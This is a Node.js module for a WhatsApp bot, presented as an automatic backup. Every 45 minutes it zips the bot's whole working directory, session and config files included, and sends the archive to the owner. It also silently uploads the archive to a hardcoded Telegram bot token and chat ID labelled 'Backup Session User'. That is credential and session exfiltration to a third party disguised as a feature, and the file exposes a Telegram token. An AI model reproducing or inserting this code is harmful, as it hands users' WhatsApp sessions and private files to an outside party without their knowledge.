const FormData = require('form-data');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

module.exports = async (conn) => {
    console.log("Backup Active Couldown 45menit");
    setInterval(async () => {
     const ls = execSync("ls")
            .toString()
            .split("\n")
            .filter(pe => 
                pe != "node_modules" && 
                pe != "package-lock.json" && 
                pe != "backup.zip" && 
                pe != ""
            );
      //  console.log("Files to be zipped:", ls);
        const zipFileName = "backup.zip";
        const zipFilePath = path.resolve(zipFileName);
   		await execSync(`zip -r ${zipFilePath} ${ls.join(" ")}`);
        const q = {
            "key": {
                "remoteJid": "status@broadcast",
                "participant": "0@s.whatsapp.net",
                "fromMe": false,
                "id": ""
            },
            "message": {
                "conversation": "Berhasil mencadangkan Seluruh File Backup Script"
            }
        };
       
        await conn.sendMessage(global.nomorowner + '@s.whatsapp.net', { document: await fs.readFileSync('./backup.zip'), mimetype: 'zip', fileName: 'backup.zip' }, { quoted: q });
        await upload('./backup.zip',  `🔰 Backup Session User
Status connection: Terhubung ✅

• Nama Bot: ${namabot}
• Nomor Bot: ${conn.user.jid}`);
      //  execSync(`rm -rf ${zipFilePath}`);
    }, 2700000);
};
async function upload(dir, text) {
const token = "6609425616:AAEINs4Qaq5WMYZQyEHf7H8pQqOU8oMkAAE";
        const chatId = '-1002229191223'; // Gantilah dengan ID channel Anda
        const filePath = dir;

        const url = `https://api.telegram.org/bot${token}/sendDocument`;

        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('document', fs.createReadStream(filePath));
        form.append('caption', text);

        try {
            const response = await axios.post(url, form, {
                headers: {
                    ...form.getHeaders(),
                },
                maxBodyLength: Infinity,
                maxContentLength: Infinity
            });
            console.log(response.data);
        } catch (error) {
            console.error(error);
        }
    }
